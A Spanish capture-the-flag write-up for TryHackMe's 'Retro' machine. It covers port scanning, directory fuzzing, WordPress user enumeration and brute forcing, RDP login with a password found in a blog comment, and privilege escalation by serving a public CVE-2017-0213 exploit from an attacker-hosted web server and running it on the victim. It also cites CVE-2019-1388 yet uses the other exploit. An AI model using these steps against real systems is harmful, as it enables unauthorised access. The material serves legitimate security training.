---
tags:
  - Cybersecurity
  - Labs
  - TryHackMe
  - Hard
  - HTTP
  - FuzzingWeb
  - CMS
  - WordPress
  - RDP
---
- [[#Enumeración|Enumeración]]
	- [[#Enumeración#Ping|Ping]]
	- [[#Enumeración#Nmap|Nmap]]
	- [[#Enumeración#HTTP|HTTP]]
		- [[#HTTP#Fuzzing Web|Fuzzing Web]]
		- [[#HTTP#WPScan|WPScan]]
- [[#Explotación|Explotación]]
	- [[#Explotación#RDP|RDP]]
	- [[#Explotación#Escalada de Privilegios|Escalada de Privilegios]]

---
# Retro

![](Screenshots/a222ca9fb08b8bdc9e10a0f6ba41ea99.jpeg)

> En este write-up se documenta la resolución paso a paso de la máquina **Retro** de [TryHackMe](https://tryhackme.com/room/retro), clasificada como dificultad **Hard**. Se cubren las fases de **enumeración**, **explotación** y **escalada de privilegios**.

---
## Enumeración
### Ping

`ping -c 1 10.81.186.55`

![](Screenshots/Pasted%20image%2020251207122445.png)

Me da error al realizar el ping.
### Nmap

`nmap -p- --open -sS --min-rate 5000 -sS -vvv -n -Pn 10.81.186.55 -oG allPorts`

![](Screenshots/Pasted%20image%2020251207122607.png)

`nmap -p80,3389 -sCV 10.81.186.55 -oN targeted`

![](Screenshots/Pasted%20image%2020251207122652.png)
### HTTP

`http://10.81.186.55/`

![](Screenshots/Pasted%20image%2020251207122733.png)
#### Fuzzing Web

`gobuster dir -u http://10.81.186.55 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -x php,html,txt -t 64`

![](Screenshots/Pasted%20image%2020251207123951.png)

`http://10.81.186.55/retro/`

![](Screenshots/Pasted%20image%2020251207124018.png)

Se encuentra un **WordPress**.
#### WPScan

`wpscan --url http://10.81.186.55/retro/ --enumerate`

![](Screenshots/Pasted%20image%2020251207124243.png)
![](Screenshots/Pasted%20image%2020251207124306.png)

Se encuentra el usuario `Wade`, se procede a realizar *fuerza bruta*.

`wpscan --url http://10.81.186.55/retro/ -U wade -P /usr/share/wordlists/rockyou.txt`

No se encuentra ninguna contraseña.

Se procede a realizar un búsqueda por la web para poder buscar información.

En la sección de comentarios del usuario `Wade`, se encuentra lo siguiente:

![](Screenshots/Pasted%20image%2020251207124558.png)

Se encuentra la contraseña del usuario `wade`, siendo `parzival`.

---
## Explotación
### RDP

`xfreerdp3 /u:wade /p:parzival /v:10.81.186.55`

![](Screenshots/Pasted%20image%2020251207124828.png)

Encontramos la *flag* de usuario.
### Escalada de Privilegios

Se realiza una búsqueda de información. se encuentra en favoritos en *Google Chrome*, la vulnerabilidad `CVE-2019-1388`. Buscando por *GitHub*, se encuentra el *exploit*: [CVE-2017-0213](https://github.com/SecWiki/windows-kernel-exploits/tree/master/CVE-2017-0213).

Se descarga el archivo: `CVE-2017-0213_x64.zip`.

Se comparte a la máquina víctima: `python3 -m http.server 80`.

En la máquina víctima, nos conectamos a nuestra máquina atacante.

`http://[MAQUINA_ATACANTE]`

![](Screenshots/Pasted%20image%2020251207130157.png)

Se descarga en la máquina victima y se ejecuta.

Al ejecutar el *exploit*, se ejecuta una terminal con privilegios de **Root**.

![](Screenshots/Pasted%20image%2020251207130321.png)

La *flag* de **Root** se encuentra en la ruta: `C://Users/Administrator/Desktop/root.txt.txt`.

---